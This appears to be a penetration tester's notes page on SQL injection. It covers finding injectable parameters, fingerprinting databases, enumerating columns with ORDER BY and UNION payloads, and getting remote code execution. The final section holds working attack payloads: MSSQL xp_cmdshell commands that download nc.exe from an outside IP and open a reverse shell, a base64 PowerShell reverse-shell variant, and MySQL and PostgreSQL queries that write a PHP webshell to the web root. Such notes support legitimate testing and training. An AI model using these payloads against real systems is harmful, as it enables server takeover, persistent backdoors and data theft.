## Identifying SQLi
#### Identify Parameters
Look for **ANY** [[1.2.5 Web Application Enumeration#Parameter Fuzzing|parameters]] that can be manipulated by the user.
#### Fuzz Payloads
Using Burp's Intruder, fuzz with some common [[SQLi Fuzzing Payloads]].
#### Filter Results
- Look for errors in the responses . Can also use Burp's `Grep - Match` and add [[SQLi Response Filter|this filter]]
- Look for longer response times to indicate Blind SQLi
#### Identify Database
###### Generic Error-Based Identification
```
You have an error in your SQL syntax near '...' at line 1   # MySQL
Unclosed quotation mark after the character string '...'   # MSSQL
syntax error at or near "..."                              # PostgreSQL
ORA-00933: SQL command not properly ended                 # Oracle
SQLITE_ERROR: near "..."                                   # SQLite
```
###### MySQL / MariaDB
```
SELECT @@version;
SELECT version();
SELECT @@version_comment;
```
###### MSSQL
```
SELECT @@version;
SELECT SERVERPROPERTY('ProductVersion');
SELECT SERVERPROPERTY('Edition');
```
###### PostgreSQL
```
SELECT version();
SELECT current_setting('server_version');
```
###### Oracle
```
SELECT * FROM v$version;
SELECT banner FROM v$version;
SELECT version FROM v$instance;
```
###### SQLite
`SELECT sqlite_version();`

---
## Exploiting SQLi
Once an exploitable parameter has been identified, we can construct queries to interrogate the database or more:
### Authentication Bypass

### Database Enumeration
#### Determine the number of columns required
###### Method 1
`' ORDER BY 1-- `
`' ORDER BY 2-- `
`' ORDER BY 3-- `

Continue until an error is hit such as:
`The ORDER BY position number 3 is out of range of the number of items in the select list.`
###### Method 2
`' UNION SELECT NULL-- `
`' UNION SELECT NULL,NULL-- `
`' UNION SELECT NULL,NULL,NULL-- `
###### Oracle Specific Syntax
`' UNION SELECT NULL FROM DUAL--`
**Note:** On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose.

If the number of nulls does not match the number of columns, an error such as the following should be returned:
`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

---
### Remote Code Execution
###### MSSQL XP_CMDSHELL
```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -command "(New-Object System.Net.WebClient).DownloadFile(''http://10.10.14.158/nc.exe'', ''C:\Reports\nc.exe'')"';
EXEC xp_cmdshell 'C:\Reports\nc.exe 10.10.14.158 4444 -e cmd.exe'
```
OR
`EXEC xp_cmdshell 'powershell -e "<base64-powershell-reverseshell>"'`
###### MySQL & MariaDB Webshell Injection
``' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //``
###### PostgreSQL Webshell Injection
`COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/tmp/webshell.php';`